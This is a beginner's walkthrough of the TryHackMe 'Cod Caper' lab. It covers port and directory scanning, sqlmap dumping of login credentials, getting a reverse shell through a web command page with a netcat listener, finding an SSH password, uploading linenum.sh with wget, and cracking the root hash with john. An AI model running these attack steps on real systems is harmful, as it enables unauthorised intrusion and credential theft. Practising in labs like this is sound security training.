#The Code Caper

![alt_text](TheCodCaper/cod1.png "image_tooltip")

This is a writeup for the room [The Cod Caper at TryHackMe](https://tryhackme.com/room/thecodcaper)

I used Parrot OS to complet the room, so there might be a difference of syntax in the commands!

The target IP for me was 10.10.113.161 and that is what you will be seeing through my screenshots. Just replace by the target IP given to you when you deploy the machine.


Have fun!! 

`CryptoTzipi aka CyberLola`

![alt_text](TheCodCaper/cod3.png "image_tooltip")

VERY CUTE!! Read the story and deploy the machine!!
No answers needed for this one

![alt_text](TheCodCaper/cod4.png "image_tooltip")


We will start with our host enumeration by using nmap with the following command

`nmap -sC -A <IP> -T 4`

(the -T 4 switch is just to speed up things a little bit)


![alt_text](TheCodCaper/cod2.png "image_tooltip")

By doing that you will be able to answer all questions on task one!!


![alt_text](TheCodCaper/cod26.png "image_tooltip")


Next we will do web enumeration using the tool gobuster.
If you are unsure about the usage, just type
`gobuster -h`

and go through the different options!
For our task here, we will use 

`gobuster dir -u http://IP -w /use/your/own/file/path!!/big.txt`

I usually go with the dirb lists such as common.txt but since the task tells us to use one of the (awesome) SecLists, I complied and used it!


![alt_text](TheCodCaper/cod5.png "image_tooltip")


We find something interesting in this scan!

That concludes task 3.


![alt_text](TheCodCaper/cod27.png "image_tooltip")


Typing our findings  into a browser...


![alt_text](TheCodCaper/cod6.png "image_tooltip")


And we got ourselves a login page!! Cool!! Going ahead and digging a little more, we can see..

![alt_text](TheCodCaper/cod7.png "image_tooltip")

(you can see the same thing by just right clicking in the webpage and then clicking "View Page Source"..it's probably the easiest way, but I just wanted to share another way!!)

It is indeed an authentication page!! 

But we don't have any credentials :( ...
YET!

The task wants us to use a tool called sqlmap (it was VERY useful duing the eJPT exam!) 

WE will go ahead and use the command

`sqlmap -u http://IP/administrator.php --forms --dump`

And wait ... (hopefully you won't have to wait as long as I did!!) 

![alt_text](TheCodCaper/cod22.png "image_tooltip")

I have to apologize for the lack of screenshots showing the small table where the credentials can be seen and also the SQL injection vulnerabilities.. :(
(I forgot to take it and my machines now has long expired! N00b mistake, sorry about that)

`pingudad:secretpass`

And through the finished sqlmap scan we can find 3 SQL vulnerabilities!


![alt_text](TheCodCaper/cod28.png "image_tooltip")


SWEET!! We have credentials, so now we can just login as pingu's dad :)

![alt_text](TheCodCaper/cod8.png "image_tooltip")

we can run commands on this page! Nice!

That also means that we can easily run a reverse shell in there!

The suggestions in the room are great ( I picked one and put it in this repository, if it is easier for you)

Just make sure you change the IP ... about the port, they suggest 1234, I like my usual 7777 :)


Copy/paste it in there and BEFORE you hit ENTER, you need to start a netcat listener in your own terminal 

`nc -lvnp 7777`  (or any port you chose)

THEN hit enter in the webpage, where you pasted the shell

Take a peek at your listener and this should be able to see something like this ...

![alt_text](TheCodCaper/cod29.png "image_tooltip")

If you look closely, that also gives you the answer for a question in the task!!

Here woudl be a good time to stabilize this shell by using 

`python3 -c 'import pty;pty.spawn("/bin/bash")' `

Or dig a little longer and get another answer out of the way!!

![alt_text](TheCodCaper/cod30.png "image_tooltip")

Next we need to find the ssh password!!

I went ahead, stabilized my shell with the command above and then tried to find any file in there with "pass" in it by running

`find / -name pass* 2>/dev/null`


![alt_text](TheCodCaper/cod13.png "image_tooltip")

LOTS of output!! There's gotta be an easier/better way to do that, but that's what I came up with and it worked!

Go through all that output and one file will definitely catch your attention!!

![alt_text](TheCodCaper/cod14.png "image_tooltip")

AND ....

![alt_text](TheCodCaper/cod15.png "image_tooltip")

BOOM! We have the SSH password!!


![alt_text](TheCodCaper/cod32.png "image_tooltip")


We ssh with pingu's credentials which we obtained in the previous task.

On this task we are supposed to upload a VERY handy tool.
2 methods of achieving that are explained to us.

I am a fan of the python server + wget, so that's what we will use

Set the server on a separate tab ... (make sure you are in the same directory where you saved linenum.sh!!!)

`sudo python3 -m http.server 80`

![alt_text](TheCodCaper/cod16.png "image_tooltip")

then proceed to upload the tool by wget, from the /tmp (why? Because anyone can write into it, you don't need any privileges, making it a good spot to upload tools)

`wget http://IP:80/linenum.sh linenum.sh`

![alt_text](TheCodCaper/cod17.png "image_tooltip")


After uploading, we must make it executable by doing `chmod +x linenum.sh`

Run the tool!

![alt_text](TheCodCaper/cod18.png "image_tooltip")

Again, lots of output, so be patient and let linenum do its thing! :)

After the scan is finished, we go back and revise it carefully!!

![alt_text](TheCodCaper/cod19.png "image_tooltip")

That will answer the task's question!

Tasks 7, 8, and 9 are all about learning! There are no answers needed, but I highly suggest going through the 
material and studying it!

![alt_text](TheCodCaper/cod33.png "image_tooltip")


For our last task, the room suggests hashcat ... but even though I LOVE cats ...
I will go with john for this!

We save the hash in a text editor and name it pingu ( you can certainly name it whatever you wish!!)



![alt_text](TheCodCaper/cod38.png "image_tooltip")

The command goes

`john pingu --wordlist=/use your own path here/rockyou.txt`

BOOM!
We have the root password!!

![alt_text](TheCodCaper/cod21.png "image_tooltip")


CONGRATULATIONS!! WELL DONE!!

I hope this writeup was helpful!


Happy Hacking


                                    
                                    `CryptoTzipi aka CyberLola`



![alt_text](TheCodCaper/cod20.png "image_tooltip")




















 





